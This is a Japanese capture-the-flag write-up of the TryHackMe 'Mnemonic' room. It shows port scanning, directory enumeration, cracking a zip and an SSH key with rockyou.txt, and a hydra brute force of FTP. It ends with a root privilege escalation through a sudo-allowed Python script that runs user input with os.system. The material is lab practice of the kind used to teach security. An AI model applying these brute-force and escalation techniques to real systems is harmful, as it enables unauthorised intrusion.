# Mnemonic CTF

https://tryhackme.com/room/mnemonic

## Enumeration

```shell
TARGET=10.201.63.68
sudo bash -c "echo $TARGET   mnemonic.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
1337/tcp open  waste
```

```sh
sudo nmap -sS -sV -p21,80,1337 $TARGET

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

FTP, HTTP, SSH

### ディレクトリ列挙

webmasters ディレクトリを発見。

```sh
dirb http://$TARGET

---- Scanning URL: http://10.201.63.68/ ----
+ http://10.201.63.68/index.html (CODE:200|SIZE:15)                                                                  
+ http://10.201.63.68/robots.txt (CODE:200|SIZE:48)                                                                  
+ http://10.201.63.68/server-status (CODE:403|SIZE:277)                                                              
==> DIRECTORY: http://10.201.63.68/webmasters/                                                                       
                                                                                                                     
---- Entering directory: http://10.201.63.68/webmasters/ ----
==> DIRECTORY: http://10.201.63.68/webmasters/admin/                                                                 
==> DIRECTORY: http://10.201.63.68/webmasters/backups/                                                               
+ http://10.201.63.68/webmasters/index.html (CODE:200|SIZE:0)                                                        
                                                                                                                     
---- Entering directory: http://10.201.63.68/webmasters/admin/ ----
+ http://10.201.63.68/webmasters/admin/index.html (CODE:200|SIZE:0)                                                  
                                                                                                                     
---- Entering directory: http://10.201.63.68/webmasters/backups/ ----
+ http://10.201.63.68/webmasters/backups/index.html (CODE:200|SIZE:0)
```

dirsearch で zip ファイルを発見。

```sh
[00:50:39] 200 -  437B  - /webmasters/admin/admin.html
[00:50:39] 200 -  138B  - /webmasters/admin/login.html

[00:52:41] 200 -  409B  - /webmasters/backups/backups.zip
```

パスワードは rockyou.txt でクラックできた。

```sh
$ cat ./backups/note.txt 
@vill

James new ftp username: <REDACTED>
we have to work hard
```

## FTP

rockyou.txt でクラック成功。

```sh
hydra -l <REDACTED> -P /usr/share/wordlists/rockyou.txt $TARGET ftp -t 30
```

再帰的にすべてダウンロード

```sh
wget -r --user="<REDACTED>" --password="<REDACTED>" ftp://$TARGET/
```

id_rsa があった。

```sh
$ find .                                          
.
./data-3
./data-1
./data-7
./data-10
./.profile
./data-9
./data-4
./data-4/4
./data-4/id_rsa
./data-4/3
./data-4/not.txt
./data-8
./data-6
./data-2
./.bash_logout
./data-5
./.bashrc
```

パスフレーズは rockyou.txt でクラック成功。

## 権限昇格

/home/condor を確認すると、Base64形式のファイル名が2つある。1つはjpgのURL、もう1つはユーザーフラグ。

```sh
james@mnemonic:~$ ls -al /home/condor
ls: cannot access '/home/condor/..': Permission denied
ls: cannot access '/home/condor/'\''VEhNe2[REDACTED]'\''': Permission denied
ls: cannot access '/home/condor/.gnupg': Permission denied
ls: cannot access '/home/condor/.bash_logout': Permission denied
ls: cannot access '/home/condor/.bashrc': Permission denied
ls: cannot access '/home/condor/.profile': Permission denied
ls: cannot access '/home/condor/.cache': Permission denied
ls: cannot access '/home/condor/.bash_history': Permission denied
ls: cannot access '/home/condor/.': Permission denied
ls: cannot access '/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
total 0
d????????? ? ? ? ?            ?  .
d????????? ? ? ? ?            ?  ..
d????????? ? ? ? ?            ? 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
l????????? ? ? ? ?            ?  .bash_history
-????????? ? ? ? ?            ?  .bash_logout
-????????? ? ? ? ?            ?  .bashrc
d????????? ? ? ? ?            ?  .cache
d????????? ? ? ? ?            ?  .gnupg
-????????? ? ? ? ?            ?  .profile
d????????? ? ? ? ?            ? ''\''VEhNe2[REDACTED]'\'''
```

noteforjames.txt 

```sh
james@mnemonic:~$ cat /home/james/noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
```

下記ツールと、取得した数字のリストファイルを使って condor のパスワードを入手する。

https://github.com/MustafaTanguner/Mnemonic

（当時と何が異なっているのか不明だが、現在、意図されたとおりに動かないと思われる。`Your Special Code:`の値がウォークスルーと異なっているため、リストファイルとマッチしない。）

## 権限昇格２

```sh
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```

```sh
condor@mnemonic:~$ ls -al /bin/examplecode.py
-rw-r--r-- 1 root root 2352 Jul 15  2020 /bin/examplecode.py
```

システム操作をするためのスクリプト。

0入力時、inputでユーザーが入力したものをそのまま実行しているので、リバースシェルを実行するだけ。

```sh
if select == 0: 
        time.sleep(1)
        ex = str(input("are you sure you want to quit ? yes : "))

        if ex == ".":
                print(os.system(input("\nRunning....")))
        if ex == "yes " or "y":
                sys.exit()
```

このフラグは答えではない。

```sh
# cat /root/root.txt
cat /root/root.txt
THM{[REDACTED]}
```

かっこ内部の部分に対して、CyberChefのMD5ハッシュを取ってフラグを作る。

## 振り返り

- Mnemonic の発見がこのルームで一番難しいところだと思う。
- root奪取してから頭を使わせるのやめてほしい。
